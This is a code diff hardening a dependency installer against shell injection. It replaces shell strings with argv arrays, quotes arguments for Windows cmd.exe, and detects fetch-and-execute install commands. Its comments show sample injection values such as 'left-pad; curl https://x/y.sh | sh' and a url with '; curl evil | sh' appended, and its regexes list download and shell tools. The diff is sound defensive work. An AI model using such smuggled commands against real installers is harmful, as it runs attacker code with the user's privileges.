@@ -74,6 +74,100 @@ function runCmd(cmd, opts = {}) {
   }
 }
 
+// A package list is DATA. `runCmd` builds a shell string, which is right for
+// `system[].install.<platform>` — a squad author writes `brew install ffmpeg`
+// there on purpose, behind the sudo / heavy-download consent gate — and wrong
+// for `node:` and `python:`, whose entries are package tokens. Joined into a
+// shell line, `- "left-pad; curl https://x/y.sh | sh"` stopped being a package
+// name and became a second command, run by `nrv activate` with the user's own
+// privileges. Quoting is not the fix either: the pip branch wrapped tokens in
+// single quotes and an apostrophe inside a token still closed them.
+//
+// runArgv passes an argv ARRAY with no shell, so on macOS and Linux a token can
+// only ever be one argument. Windows needs one more step, and leaving it to the
+// runtime is what makes it dangerous.
+//
+// `pip`, `uv`, `curl` and `huggingface-cli` are real executables on Windows, so
+// those paths spawn directly, with no shell anywhere. `npm`, `pnpm` and `yarn`
+// ship as `.cmd` shims that no runtime starts without a shell — and the runtime
+// will NOT quote the token for us. libuv quotes an argument only when it holds a
+// space, tab or double quote:
+//
+//     if (NULL == wcspbrk(source, L" \t\"")) { /* No quotation needed */ }
+//                                                (libuv, src/win/process.c)
+//
+// `@remotion/cli@^4.0.0` — a real spec, shipped today in creative-studio and
+// genesis-circle — has none of the three, so it reaches cmd.exe raw, cmd eats
+// `^` as its own escape character, and npm silently installs
+// `@remotion/cli@4.0.0`. A different range, no error, nobody told. Swap the
+// payload and the same hole runs `calc`: `left-pad&calc`.
+//
+// So the command line is built HERE, with every argument quoted, and handed to
+// the runtime's shell path, which on Windows is `cmd.exe /d /s /c "<line>"`.
+// `/s` strips the outer pair the runtime adds and leaves ours standing, so cmd
+// sees each token quoted and `^`, `&`, `|`, `<`, `>`, `(`, `)` are data inside
+// it. Four characters survive no quoting cmd.exe understands and are refused
+// instead: `"` closes the quoting, `%` expands inside quotes, `!` expands when
+// delayed expansion is on, and a newline ends the line. No spec in the shipped
+// packs carries any of them; every metacharacter that appears in a real one
+// (`^`, `>`, `|`, `[`, `]`) passes through as data.
+const WINDOWS_UNQUOTABLE = /["%!\r\n]/;
+
+/**
+ * The cmd.exe line for an argv, or the token that cannot be quoted into one.
+ * Exported for test: this is the whole Windows decision, and the spawn it feeds
+ * cannot be exercised from a POSIX runner.
+ */
+function windowsShellPlan(argv) {
+  for (const a of argv) {
+    const m = WINDOWS_UNQUOTABLE.exec(String(a));
+    if (m) return { ok: false, char: m[0], token: String(a) };
+  }
+  // The program name is left bare: a leading quote is what makes cmd apply its
+  // own stripping rules to the rest of the line. Every argument after it is
+  // quoted unconditionally, so the rule holds for tokens and flags alike.
+  return { ok: true, line: [argv[0], ...argv.slice(1).map(a => `"${a}"`)].join(' ') };
+}
+
+function runArgv(argv, opts = {}) {
+  const verbose = process.env.MAESTRO_ACTIVATOR_VERBOSE === '1';
+  const common = {
+    stdio: verbose ? 'inherit' : 'pipe',
+    timeout: opts.timeoutMs || 600000,
+    cwd: opts.cwd || undefined,
+    env: { ...process.env, ...(opts.env || {}) },
+    windowsHide: true,
+  };
+  let r;
+  // `windowsShim: true` marks the callers whose program is a `.cmd` on Windows.
+  // Everyone else spawns argv directly on every platform.
+  if (PLATFORM === 'win32' && opts.windowsShim) {
+    const plan = windowsShellPlan(argv);
+    if (!plan.ok) {
+      return { ok: false, error:
+        `refused on Windows: the token ${JSON.stringify(plan.token)} contains ${JSON.stringify(plan.char)}, ` +
+        `which survives no quoting cmd.exe understands, and ${argv[0]} can only be started through cmd.exe there. ` +
+        `Every other character, ^ and > and | included, is passed as data. ` +
+        `Drop that one from the spec, or run the install yourself and re-activate.` };
+    }
+    r = spawnSync(plan.line, { ...common, shell: true });
+  } else {
+    r = spawnSync(argv[0], argv.slice(1), { ...common, shell: false });
+  }
+  if (r.error) return { ok: false, error: r.error.message };
+  if (r.signal) return { ok: false, error: `${argv[0]} killed by ${r.signal}`, code: null, stderr: r.stderr ? r.stderr.toString() : null };
+  if (r.status !== 0) {
+    return { ok: false, error: `${argv[0]} exited ${r.status}`, code: r.status, stderr: r.stderr ? r.stderr.toString() : null };
+  }
+  return { ok: true, output: r.stdout ? r.stdout.toString() : '' };
+}
+
+// Human-readable rendering of an argv, for `--dry-run` output and error text
+// ONLY. Nothing executes this string — that is the point of runArgv.
+function displayCmd(argv) {
+  return argv.map(a => (/[^\w@.\-+=/:]/.test(a) ? `'${a.replace(/'/g, "'\\''")}'` : a)).join(' ');
+}
+
 function ensureDir(p) {
   if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true });
 }
@@ -147,6 +241,75 @@ function allChecksPass(norm) {
   return norm.checks.every(c => checkCmd(c).ok);
 }
 
+// Fetch-and-execute detection for `system[].install.<platform>`.
+//
+// That field IS a shell line by design — `brew install ffmpeg` is what a squad
+// author should write there — and the consent gate in front of it only ever
+// matched `sudo`. So `curl -fsSL https://bun.sh/install | bash`, which ships
+// today in brandcraft and grok-studio-nirvana, ran on the buyer's machine with
+// no prompt at all: a third party's script, fetched and executed, because
+// someone asked to install dependencies. The exit-code contract already
+// promised 2 for "heavy installs", so this fills a promise rather than
+// inventing one.
+//
+// The line the detector draws is fetch-and-EXECUTE. Downloading is not
+// executing: `curl -o model.bin <url>`, `brew install`, `apt-get install` and
+// `winget install` stay untouched, because a gate that fires on ordinary
+// installs is a gate everyone learns to pass with --confirm-heavy without
+// reading it.
+const FETCHERS = String.raw`curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod`;
+const INTERPRETERS = String.raw`bash|sh|zsh|dash|ksh|fish|python3?|perl|ruby|iex|Invoke-Expression`;
+// Anything that runs a file, for the two-step shape: the interpreters above plus
+// the ones that only ever appear as stage two (`node`, `powershell`, `msiexec`,
+// `installer`) and a bare `./thing`.
+const RUNNERS = String.raw`bash|sh|zsh|dash|ksh|fish|python3?|node|perl|ruby|powershell|pwsh|msiexec|installer|iex|Invoke-Expression`;
+// Command position: start of line, or after `;`, `&`, `&&`, `|`, `||`, `(` or a
+// newline, with any `sudo -E` / `env -i` / `exec` prefix skipped. Without this
+// anchor, a PATH like `/tmp/sh` would read as an invocation of `sh`.
+const CMD_POSITION = String.raw`(?:^|[;&|(\n])\s*(?:(?:sudo|env|command|exec)(?:\s+-{1,2}\S+)*\s+)*`;
+const URL_IN_COMMAND = /https?:\/\/[^\s'"|)>]+/i;
+const FETCHER_PRESENT = new RegExp(String.raw`\b(?:${FETCHERS})\b`, 'i');
+
+const DIRECT_FORMS = [
+  // curl … | bash · wget -qO- … | sh · irm … | iex · … | sudo -E bash -
+  // The prefix group matters: `| sudo -E bash -` is the nodesource shape, and a
+  // detector that only allowed a bare `sudo` would wave it through.
+  new RegExp(String.raw`\b(?:${FETCHERS})\b[\s\S]*?\|\s*(?:(?:sudo|env|command|exec)(?:\s+-{1,2}\S+)*\s+)*(${INTERPRETERS})\b`, 'i'),
+  // bash <(curl …) · sh <(wget …)
+  new RegExp(String.raw`\b(${INTERPRETERS})\b[^\n]*?<\(\s*(?:${FETCHERS})\b`, 'i'),
+  // sh -c "$(curl …)" · eval "$(curl …)" · eval `curl …`
+  new RegExp(String.raw`\b(${INTERPRETERS}|eval)\b[^\n]*?(?:\$\(|` + '`' + String.raw`)\s*(?:${FETCHERS})\b`, 'i'),
+];
+
+// The two-step shape, which is the COMMON one in the wild: download an installer,
+// then run it. `ebook-maestro-nirvana` ships it today in genesis-circle and
+// publishing-knowledge — curl a zip, unzip it, `sh` the file that came out — and
+// no pipe or substitution appears anywhere in it. The risk is identical to
+// `curl | bash`: if the host is compromised, the buyer runs whatever it served.
+const TWO_STAGE_RUN = new RegExp(CMD_POSITION + String.raw`(?:(${RUNNERS})\b|(\.{1,2}\/\S+))`, 'i');
+
+/**
+ * `{ url, shell, form }` when the command downloads something and runs it, else
+ * null. `form` is the confidence, and it reaches the buyer: `direct` is a pipe
+ * or a substitution and is not arguable; `two_stage` is a fetch and a runner in
+ * the same command, which is a strong signal rather than a proof.
+ *
+ * Exported for test: the corpus it has to judge is the 232 install commands in
+ * the shipped packs, and judging them must not mean running them.
+ */
+function fetchAndExecute(cmd) {
+  const text = String(cmd || '');
+  const url = URL_IN_COMMAND.exec(text);
+  for (const form of DIRECT_FORMS) {
+    const m = form.exec(text);
+    if (m) return { url: url ? url[0] : null, shell: m[1], form: 'direct' };
+  }
+  if (!url || !FETCHER_PRESENT.test(text)) return null;
+  const run = TWO_STAGE_RUN.exec(text);
+  if (!run) return null;
+  return { url: url[0], shell: run[1] || run[2], form: 'two_stage' };
+}
+
 function installSystem(dep, dryRun, confirmHeavy) {
   // Bare prereq string (e.g. "ffmpeg >= 6.0", "node >= 20"): we can only verify
   // presence — auto-installing a system tool needs a package-manager mapping we
@@ -179,18 +342,39 @@ function installSystem(dep, dryRun, confirmHeavy) {
   // sudo binary, and root does not need it). Running unprivileged, a sudo
   // command requires --confirm-heavy — the same consent gate as large
   // downloads — otherwise it is a confirmation_required item (exit 2).
+  //
+  // Fetching a remote script and executing it goes through the SAME gate, for
+  // the same reason: it is the machine doing something the person who typed
+  // `nrv activate` did not see coming. Both reasons are reported together, and
+  // the item carries the exact command, because that is the only thing the
+  // buyer can actually decide on.
   let effectiveCmd = installCmd;
   const needsSudo = /(^|\s|&&|\|\||;)\s*sudo\s+/.test(installCmd);
   const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
+  const fetchExec = fetchAndExecute(installCmd);
   if (needsSudo && isRoot) {
     effectiveCmd = installCmd.replace(/(^|\s|&&|\|\||;)(\s*)sudo\s+/g, '$1$2');
-  } else if (needsSudo && !confirmHeavy) {
+  }
+  const reasons = [];
+  if (needsSudo && !isRoot) reasons.push('runs as root through sudo');
+  if (fetchExec) {
+    reasons.push(fetchExec.form === 'direct'
+      ? `downloads ${fetchExec.url || 'a remote address'} and executes it with ${fetchExec.shell}`
+      : `downloads ${fetchExec.url} and then runs ${fetchExec.shell} in the same command — two steps rather than a pipe, so read it before accepting`);
+  }
+  if (reasons.length > 0 && !confirmHeavy) {
     return {
       name: dep.name,
       status: 'confirmation_required',
       kind: 'system',
       cmd: installCmd,
-      reason: 'Install command needs sudo. Re-run with --confirm-heavy to accept (or install it yourself and re-activate).',
+      needs_sudo: needsSudo && !isRoot,
+      fetches: fetchExec ? fetchExec.url : null,
+      executes_with: fetchExec ? fetchExec.shell : null,
+      execution_form: fetchExec ? fetchExec.form : null,
+      reason: `Consent needed before this runs: it ${reasons.join(', and it ')}.\n`
+        + `  ${installCmd}\n`
+        + `  Re-run with --confirm-heavy to accept it, or install it yourself and re-activate.`,
     };
   }
   const installResult = runCmd(effectiveCmd);
@@ -214,18 +398,17 @@ function installPython(spec, dryRun) {
   const manager = norm.manager === 'uv' ? 'uv' : 'pip';
   const target = expandPath((!Array.isArray(spec) && (spec.target_dir || (spec.use_squad_venv ? '.venv' : null))) || null);
 
-  let cmd;
+  let argv;
   if (manager === 'uv') {
-    cmd = `uv pip install ${tokens.map(p => `'${p}'`).join(' ')}`;
+    argv = ['uv', 'pip', 'install', ...tokens];
   } else {
     // pip vs pip3 fallback (macOS system python often only ships pip3); --user
     // when there is no explicit target dir/venv so it works on managed pythons.
     const pipBin = checkCmd('pip --version').ok ? 'pip' : (checkCmd('pip3 --version').ok ? 'pip3' : 'pip');
-    const userFlag = target ? '' : ' --user';
-    cmd = `${pipBin} install${userFlag} ${tokens.map(p => `'${p}'`).join(' ')}`;
+    argv = [pipBin, 'install', ...(target ? [] : ['--user']), ...tokens];
   }
-  if (dryRun) return { status: 'would_install', kind: 'python', manager, cmd };
-  const r = runCmd(cmd, { cwd: target });
+  if (dryRun) return { status: 'would_install', kind: 'python', manager, cmd: displayCmd(argv), argv };
+  const r = runArgv(argv, { cwd: target });
   return {
     status: r.ok ? 'installed' : 'install_failed',
     kind: 'python',
@@ -243,14 +426,14 @@ function installNode(spec, dryRun, squadDir) {
   if (allChecksPass(norm)) return { status: 'already_present', kind: 'node', manager: norm.manager, global: norm.global, packages: tokens };
   const manager = norm.manager || 'npm';
   const g = norm.global;
-  const cmd = manager === 'pnpm' ? `pnpm add${g ? ' -g' : ''} ${tokens.join(' ')}`
-            : manager === 'yarn' ? `yarn ${g ? 'global add' : 'add'} ${tokens.join(' ')}`
-            : `npm install${g ? ' -g' : ''} ${tokens.join(' ')}`;
-  if (dryRun) return { status: 'would_install', kind: 'node', manager, global: g, cmd };
+  const argv = manager === 'pnpm' ? ['pnpm', 'add', ...(g ? ['-g'] : []), ...tokens]
+             : manager === 'yarn' ? ['yarn', ...(g ? ['global', 'add'] : ['add']), ...tokens]
+             : ['npm', 'install', ...(g ? ['-g'] : []), ...tokens];
+  if (dryRun) return { status: 'would_install', kind: 'node', manager, global: g, cmd: displayCmd(argv), argv };
   // Local installs default to the squad's OWN dir, so npm never pollutes the
   // ~/squads root with a stray node_modules/package-lock. An explicit spec.cwd
   // (object form) still wins; global installs (-g) ignore cwd.
-  const r = runCmd(cmd, { cwd: g ? undefined : (expandPath(!Array.isArray(spec) ? spec.cwd : null) || squadDir) });
+  const r = runArgv(argv, { windowsShim: true, cwd: g ? undefined : (expandPath(!Array.isArray(spec) ? spec.cwd : null) || squadDir) });
   return { status: r.ok ? 'installed' : 'install_failed', kind: 'node', manager, global: g, packages: tokens, error: r.ok ? null : r.error };
 }
 
@@ -291,10 +474,13 @@ function installService(svc, dryRun) {
     if (h.ok) return { name: svc.name, status: 'already_running', kind: 'service' };
   }
 
-  // 2. Clone if missing
+  // 2. Clone if missing. `repo` and `install_dir` are manifest DATA, like the
+  // package tokens and the model url — argv, never a shell line. (`install_cmd`
+  // below is the opposite: a shell line the squad author wrote on purpose.)
   if (svc.repo && !alreadyCloned) {
-    if (dryRun) return { name: svc.name, status: 'would_clone', kind: 'service', cmd: `git clone ${svc.repo} ${installDir}` };
-    const r = runCmd(`git clone ${svc.repo} ${installDir}`);
+    const argv = ['git', 'clone', String(svc.repo), ...(installDir ? [installDir] : [])];
+    if (dryRun) return { name: svc.name, status: 'would_clone', kind: 'service', cmd: displayCmd(argv), argv };
+    const r = runArgv(argv);
     if (!r.ok) return { name: svc.name, status: 'clone_failed', kind: 'service', error: r.error };
   }
 
@@ -326,11 +512,13 @@ function installCustomNodes(nodes, dryRun) {
       results.push({ name: node.name, status: 'already_present', kind: 'custom_node' });
       continue;
     }
+    // Same rule as services: `repo` is data out of the manifest.
+    const argv = ['git', 'clone', String(node.repo), dst];
     if (dryRun) {
-      results.push({ name: node.name, status: 'would_clone', kind: 'custom_node', cmd: `git clone ${node.repo} ${dst}` });
+      results.push({ name: node.name, status: 'would_clone', kind: 'custom_node', cmd: displayCmd(argv), argv });
       continue;
     }
-    const r = runCmd(`git clone ${node.repo} ${dst}`);
+    const r = runArgv(argv);
     results.push({ name: node.name, status: r.ok ? 'installed' : 'clone_failed', kind: 'custom_node', error: r.ok ? null : r.error });
   }
   return { status: 'done', kind: 'custom_nodes', items: results };
@@ -360,21 +548,26 @@ function installModels(models, dryRun, opts = {}) {
       });
       continue;
     }
-    let cmd;
+    // Same field-is-data rule as `node:` and `python:`: `repo`, `url`, `filename`
+    // and `install_to` come out of dependencies.yaml, so a shell line here would
+    // let `url: "https://x/m.bin; curl evil | sh"` run its own command. argv also
+    // fixes the quieter half of the old bug — an install path with a space used
+    // to split into two arguments.
+    let argv;
     if (m.source === 'huggingface') {
-      cmd = `huggingface-cli download ${m.repo} ${m.filename || ''} --local-dir ${dst}`.trim();
+      argv = ['huggingface-cli', 'download', String(m.repo), ...(m.filename ? [String(m.filename)] : []), '--local-dir', dst];
     } else if (m.source === 'url') {
-      cmd = `curl -L -o ${fileTarget} ${m.url}`;
+      argv = ['curl', '-L', '-o', fileTarget, String(m.url)];
     } else {
       results.push({ name: m.name, status: 'unknown_source', kind: 'model', source: m.source });
       continue;
     }
     if (dryRun) {
-      results.push({ name: m.name, status: 'would_download', kind: 'model', cmd });
+      results.push({ name: m.name, status: 'would_download', kind: 'model', cmd: displayCmd(argv), argv });
       continue;
     }
     ensureDir(dst);
-    const r = runCmd(cmd, { timeoutMs: 7200000 });
+    const r = runArgv(argv, { timeoutMs: 7200000 });
     results.push({ name: m.name, status: r.ok ? 'downloaded' : 'download_failed', kind: 'model', error: r.ok ? null : r.error });
   }
   return { status: 'done', kind: 'models', items: results };
@@ -654,7 +847,9 @@ function deactivate(slug) {
   return { ok: true, slug, deactivated_at: new Date().toISOString() };
 }
 
-module.exports = { activate, status, deactivate };
+// windowsCmdMetachar is exported for its own test: it is the whole Windows
+// decision, and the spawn it guards cannot be exercised from a POSIX runner.
+module.exports = { activate, status, deactivate, _windowsShellPlan: windowsShellPlan, _fetchAndExecute: fetchAndExecute };
 
 // CLI — exit codes follow the contract documented in scripts/activate-squad.sh:
 //   0 = ok / activated
